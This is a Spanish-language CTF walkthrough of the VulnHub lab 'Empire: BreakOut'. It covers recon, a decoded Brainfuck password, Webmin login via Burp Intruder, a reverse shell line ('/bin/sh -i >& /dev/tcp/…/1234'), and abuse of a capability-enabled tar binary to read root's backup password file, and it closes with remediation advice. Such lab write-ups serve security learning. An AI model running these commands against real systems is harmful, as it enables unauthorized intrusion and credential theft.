
**Nombre de la maquina**
	Empire: BreakOut
**Dirección de enlace**
	https://www.vulnhub.com/entry/empire-breakout,751/
**Modo de Red**
	NAT
**Virtualizado**
	VirtualBox

### Recopilación de Información

Al tener en cuenta que la maquina se encuentra en el mismo segmento de red, procedemos a usar el comando **[[Recursos#**netdiscover**|netdiscover]]**.

	netdiscover -r 10.0.2.0/24

![[Pasted image 20240330233124.png]]

Una vez obtenemos un escaneo de la red local, y obtenemos la IP de cada uno de los dispositivos en la red local, debemos a proceder a identificar cual es la maquina que vamos a atacar.

Para poder identificar cual es la maquina objetivo, procedimos a realizar un escaneo con la herramienta **[[Recursos#nmap|nmap]]** en cada una de las IP usando el siguiente comando.

	sudo nmap -sV -p- 10.0.2.4

![[Pasted image 20240330233424.png]]

Al realizar el escaneo determinamos que la IP **10.0.2.4** pertenece a la maquina objetivo.

> [!Notas] Servicios ejecutados en los puertos
>  80       = Detectamos que se esta ejecutando un **Apache con versión 2.4.51**
>  
> 10000 = Detectamos que se esta ejecutando un **Webmin httpd**, lo cual nos indica que existe una web administrativa a lo cual intentaremos acceder mas tarde.
> 
> 20000 = Detectamos que se esta ejecutando un **Webmin httpd**, lo cual nos indica que existe una web administrativa a lo cual intentaremos acceder mas tarde.

Ahora que sabemos que se ejecuta un Apache y un Webmin en los puerto 10000, 20000; procedemos a realizar reconocimiento desde la web, en búsqueda de cualquier indicio de información extra.

![[Pasted image 20240330233640.png]]

Notamos que, mientras realizábamos reconocimiento, en el código de la pagina, dejaron un mensaje encriptado de la clave de acceso.

	En esta ocacion sabemos por defecto que esta encriptado en un lenguaje llamado "BrainFuck", asi que omitiremos la parte de identificar el cifrado.

Procedemos a desencriptar la clave de acceso que nos dejaron.

![[Pasted image 20240330233805.png]]

Ahora procedemos a movernos a los puertos abiertos donde se ejecutar un **Webmin Httpd**.

![[Pasted image 20240330233836.png]]

### Enumeración de usuarios

Para esta ocasión haremos uso de la herramienta **[[Recursos#**enum4linux**|enum4linux]]** usando el siguiente comando.

	enum4linux -a 10.0.2.4

![[Pasted image 20240330234249.png]]

Una vez hemos la herramienta halla finalizado y nos halla dado una lista de múltiples usuarios, procederemos a usar la herramienta de intruder de BurpSuite para probar cual de los usuarios es compatible con la clave de acceso que obtuvimos con anterioridad.

![[Pasted image 20240330234400.png]]

Según BurpSuite, el usuario **cyber** es el único usuario el cual ha dado acceso, pero únicamente siendo este la clave de acceso del **Webmin** que se ejecuta en el puerto **10000**.

### Explotación

Procedemos a acceder.

![[Pasted image 20240330234441.png]]

Revisando la pagina, no encontramos con una command shell, el cual nos permite ejecutar comandos con el usuario cyber, pero sin privilegios root.

Nuestra primera técnica de explotación será realizar una reverse shell, aprovechando la command shell.

Antes que nada necesitamos abrir un puerto en nuestra computadora, y para ello nos apoyaremos de la herramienta **[[Recursos#**nc**|netcat]]** con el siguiente comando.

	nc -lvp 1234

![[Pasted image 20240403221758.png]]

Una vez abrimos el puerto **1234** y lo dejamos en modo escucha procedemos a realizar el reverse shell en la command shell del Web min.

Para esta ocasión ocupamos una lista con payloads y probamos cual de todos es util.

	/bin/sh -i >& /dev/tcp/10.0.2.6/1234 0>&1

![[Pasted image 20240330234535.png]]

Una vez introducimos la shell, nos dirigimos a nuestra consola de comandos.

![[Pasted image 20240403221815.png]]

Hemos establecido conexión con éxito!.

### Post - Explotación/Escalado de privilegios

Una vez estamos dentro de la maquina, toca navegar entre todos los directorios en busque del objetivo.

Lo primero que hacemos es listar los archivos que se encuentran en el usuario **cyber** con el siguiente comando.

	ls

![[Pasted image 20240403223259.png]]

Obtenemos 2 archivos. **user.txt** y **tar**.

Abrimos el archivo **user.txt** para ver su contenido.

![[Pasted image 20240330235109.png]]

Ahora procedemos a realizar el uso de la herramienta **getcap** para ver los atributos de capacidades extendidas asociados con archivos y directorios con el siguiente comando.

	getcap -r / 2>/dev/null

![[captura.png]]

> [!INFO] Archivos con capacidad extendidas
> cap_ **dac** = Hace referencia al control de acceso discrecional, un mecanismo de control de acceso que permite a los usuarios definir permisos de acceso a sus propios archivos y directorios.
> 
> cap_ **read_search** =Indica que el atributo permite el archivo o ejecutable realizar operaciones de lectura y busqueda.

Notamos que el archivo **tar** tiene la capacidad de realizar operaciones de lectura y búsqueda en archivos y directorios a los que normalmente no tendría acceso de lectura y búsqueda debido a los permisos de acceso del sistema de archivos.

Así que nos aprovecharemos de ello!!!!

Al ser un sistema Linux, sabemos que existe el directorio backups, donde se alojan las contraseñas, así que no dirigimos a ellos con el siguiente comando.

	cd ../../../ & cd /var/backups/ & ls -la

![[Pasted image 20240330235526.png]]

Notamos la existencia del archivo **.old_pass.bak** indicando que el usuario **root** es el único que posee permisos de lectura y escritura, a lo cual procederemos a hacer uso del archivo **tar**.

Lo que necesitamos hacer es obtener el contenido del archivo, así que para ello debemos copiar el contenido del archivo a través de **tar** usando el siguiente comando.

	./tar -cvf password.tar /var/backups/old_pass.bak


> [!INFO] Explicacion del comando
> Ocupamos **./** para ejecutar **tar** que se encuentra en el mismo directorio.
> Ocupamos **-C** para crear un nuevo archivo tar con el contenido de old_pass.bak
> Ocupamos **-V** para mostrar la informacion detalla del archivo que esta procesando
> Ocupamos **-F** para indicar el nombre del nuevo archivo tar que estamos creando.

Listo, hemos creado un nuevo archivo **tar** con los datos de **old_pass.bak**.

Para finalizar, siempre usando el mismo archivo **tar**, extraemos la información del mismo y visualizarlo con el siguiente comando

	./tar -xf password.tar & cat password.tar

![[Pasted image 20240331000702.png]]

Y listo!!!
Hemos logrado obtener las credenciales de **root**.

### Recomendaciones

| Vulnerabilities                                                                                                                                                                                                           | Recomendacion                                                                                                                                                                                                                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Se ha identificado que en el sitio web, la existencia de exposicion de datos sencibles, mas especificamente como comentarios en el codigo de la web                                                                       | Se recomiendo evitar realizar este tipo de comentarios que contengan informacion sencible y otros que ayuden a entender mejor el funcionamiento de la pagina                                                                                                                                        |
| Se ha identificado que el sitio web, es vulnerable al uso de herramientas que realizan enumeracion de usuarios estandar.                                                                                                  | Se recomienda la implementacion de un WAF para bloquear puertos y servicios que no sean necesarios para el funcionamiento de tus sistemas. Configura reglas para permitir únicamente el tráfico esencial y bloquea el acceso no autorizado desde y hacia direcciones IP desconocidas o sospechosas. |
| Se ha identifico la falta de varias cabeceras de seguridad                                                                                                                                                                | Se recomienda la implementacion de header seguros como CSP, Referer policy, etc.                                                                                                                                                                                                                    |
| Se ha identificado que el sitio web posee un archivo tar que posee capacidades extendidas de seguridad. Estas capacidades se pueden aplicar a los archivos individuales dentro del archivo tar o el propio en su conjunto | Se recomienda eliminar o limitar el acceso al archivo, restringiendo el uso a usuarios no autorizados.                                                                                                                                                                                              |
| <br>Se ha identificado que el sitio web, posee una command shell que no posee limitaciones ni restricciones ante la ejecución de comandos.                                                                                | Limita la ejecución de comandos remotos o scripts en el sistema, especialmente aquellos que provienen de fuentes no confiables o que pueden ser maliciosos.                                                                                                                                         |
